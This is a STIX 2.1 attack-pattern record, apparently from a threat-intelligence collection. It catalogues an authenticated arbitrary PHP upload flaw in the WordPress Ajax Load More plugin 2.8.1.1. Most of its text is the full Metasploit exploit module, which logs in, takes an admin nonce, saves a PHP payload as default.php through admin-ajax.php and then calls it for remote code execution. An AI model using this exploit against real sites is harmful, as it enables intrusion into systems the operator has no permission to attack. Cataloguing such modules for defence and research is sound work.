{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0cfeb427-20a0-4d07-92d2-5bc20fdd757b",
    "created": "2024-08-14T17:12:52.557447Z",
    "modified": "2024-08-14T17:12:52.557451Z",
    "name": "Wordpress Ajax Load More PHP Upload Vulnerability",
    "description": " This module exploits an arbitrary file upload in the WordPress Ajax Load More version 2.8.1.1. It allows to upload arbitrary php files and get remote code execution. This module has been tested successfully on WordPress Ajax Load More 2.8.0 with Wordpress 4.1.3 on Ubuntu 12.04/14.04 Server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_ajax_load_more_file_upload.rb",
            "external_id": "wp_ajax_load_more_file_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "8209"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Wordpress Ajax Load More PHP Upload Vulnerability',\n      'Description'    => %q{\n        This module exploits an arbitrary file upload in the WordPress Ajax Load More\n        version 2.8.1.1. It allows to upload arbitrary php files and get remote code\n        execution. This module has been tested successfully on WordPress Ajax Load More\n        2.8.0 with Wordpress 4.1.3 on Ubuntu 12.04/14.04 Server.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Identify yourself || send an PR here\n          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['WPVDB', '8209']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Ajax Load More 2.8.1.1', {}]],\n      'DisclosureDate' => '2015-10-10',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('WP_USERNAME', [true, 'A valid username', nil]),\n        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])\n      ], self.class\n    )\n  end\n\n  def check\n    check_plugin_version_from_readme('ajax-load-more', '2.8.1.2')\n  end\n\n  def username\n    datastore['WP_USERNAME']\n  end\n\n  def password\n    datastore['WP_PASSWORD']\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'method'    => 'GET',\n      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),\n      'vars_get'  => {\n        'page'    => 'ajax-load-more-repeaters'\n      },\n      'cookie'    => cookie\n    )\n\n    if res && res.body && res.body =~ /php\",\"alm_admin_nonce\":\"([a-z0-9]+)\"}/\n      return Regexp.last_match[1]\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    vprint_status(\"Trying to login as #{username}\")\n    cookie = wordpress_login(username, password)\n    fail_with(Failure::NoAccess, \"#{peer} - Unable to login as: #{username}\") if cookie.nil?\n    store_valid_credential(user: username, private: password, proof: cookie)\n\n    vprint_status(\"Trying to get nonce\")\n    nonce = get_nonce(cookie)\n    fail_with(Failure::Unknown, \"#{peer} - Unable to get nonce\") if nonce.nil?\n\n    vprint_status(\"Trying to upload payload\")\n\n    # This must be default.php\n    filename = 'default.php'\n\n    print_status(\"Uploading payload\")\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),\n      'vars_post'   => {\n        'action'    => 'alm_save_repeater',\n        'value'     => payload.encoded,\n        'repeater'  => 'default',\n        'type'      => 'default',\n        'alias'     => '',\n        'nonce'     => nonce\n      },\n      'cookie'      => cookie\n    )\n\n    if res\n      if res.code == 200 && res.body.include?('Template Saved Successfully')\n        register_files_for_cleanup(filename)\n      else\n        fail_with(Failure::Unknown, \"#{peer} - You do not have sufficient permissions to access this page.\")\n      end\n    else\n      fail_with(Failure::Unknown, 'Server did not respond in an expected way')\n    end\n\n    print_status(\"Calling uploaded file\")\n    send_request_cgi(\n      'uri'    => normalize_uri(wordpress_url_plugins, 'ajax-load-more', 'core', 'repeater', filename)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-10",
    "x_mitre_platforms": [
        "php'"
    ]
}